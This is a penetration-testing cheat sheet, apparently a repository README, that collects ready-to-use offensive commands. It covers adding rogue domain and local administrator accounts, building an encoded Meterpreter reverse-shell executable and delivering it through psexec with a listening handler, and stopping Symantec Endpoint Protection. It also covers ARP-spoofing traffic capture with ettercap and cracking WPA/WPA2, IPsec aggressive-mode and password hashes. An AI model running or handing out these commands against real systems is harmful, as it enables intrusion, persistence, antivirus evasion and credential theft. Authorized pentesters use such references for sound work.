# Testing-Cheats-
Helpful Pentest Commands 1 

MOUNT SHARES
# Mount Windows Share with Null Session
net use x: \\server\share "" /u:

# Mount NFS share on Linux
mount -t nfs server:/share /mnt/point

# Mount Windows Share on Linux
mount -t cifs //server/share -o username=,password= /mnt/point
ADD ADMINISTRATIVE ACCOUNTS
# WINDOWS: Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# WINDOWS: Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# LINUX: Add a new user to linux and put them in the wheel group
useradd -G wheel username

# LINUX: Set the new user's password
passwd username

# LINUX: If the shell is non-interactive set the password using chpasswd
echo "username:newpass"|chpasswd
STDAPI_SYS_PROCESS_EXECUTE: OPERATION FAILED: 1314
# If you get this error while trying to drop to as shell in meterpreter, try the code below. This is a known bug in meterpreter
 
execute -f cmd.exe -c -i -H
METASPLOIT: USE CUSTOM EXECUTABLE WITH PSEXEC
# Generate an executable
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4445 R | msfencode -t exe -e x86/shikata_ga_nai -c 5 > custom.exe

# Setup multi/handler
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.0.1
LHOST => 192.168.0.1
msf exploit(handler) > set LPORT 4445
LPORT => 4445
[*] Started reverse handler on 192.168.0.1:4445
[*] Starting the payload handler...

# In another msfconsole setup psexec
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.0.2
RHOST => 192.168.0.2
msf exploit(psexec) > set SMBUser user
SMBUser => user
msf exploit(psexec) > set SMBPass pass
SMBPass => pass
msf exploit(psexec) > set EXE::Custom /path/to/custom.exe
EXE::Custom => /path/to/custom.exe
msf exploit(psexec) > exploit

# If everything works then you should see a meterpreter 
# session open in multi/handler
DISABLE ANTIVIRUS
# Disable Symantec Endpoint Protection
c:\program files\symantec\symantec endpoint protection\smc -stop
USE ETTERCAP TO SNIFF TRAFFIC
ettercap -M arp -T -q -i interface /spoof_ip/ /target_ips/ -w output_file.pcap
CRACKING WPA/WPA2 PSK
# With John the Ripper
john --incremental:all --stdout | aircrack-ng --bssid 00-00-00-00-00-00 -a 2 -w -  capture_file.cap

# With Hashcat
./hashcat-cli32.bin wordlist -r rules/d3ad0ne.rule --stdout | aircrack-ng --bssid 00-00-00-00-00-00 -a 2 -w -  capture_file.cap
CRACKING IPSEC AGRESSIVE MODE PRE-SHARED KEY
If you’ve never done this, read these first.
http://www.nta-monitor.com/wiki/index.php/Ike-scan_User_Guide
http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html

# Finding Aggressive Mode VPNs
ike-scan -A 192.168.1.0/24

# If the default transforms don't work use the generate_transforms.sh script from
# the user guide above.
generate-transforms.sh | xargs --max-lines=8 ike-scan 10.0.0.0/24

# SonicWALL VPNs require a group id, the default group id is GroupVPN
ike-scan 192.168.1.1 -A -id GroupVPN

# Use the -P argument to save the handshake to a file, which can be used by psk-crack
ike-scan 192.168.1.1 -A -Ppsk_192.168.1.1.txt

# Crack the pre-shared key using a dictionary
psk-crack -d /path/to/dictionary psk_192.168.1.1.txt
CREATE AN IP LIST WITH NMAP
nmap -sL -n 192.168.1.1-100,102-254 | grep "report for" | cut -d " " -f 5 > ip_list_192.168.1.txt
CRACK PASSWORDS WITH JOHN AND KORELOGIC RULES
for ruleset in `grep KoreLogicRules john.conf | cut -d: -f 2 | cut -d\] -f 1`; do ./john --rules:${ruleset} 
-w:<wordlist> <password_file> ; done
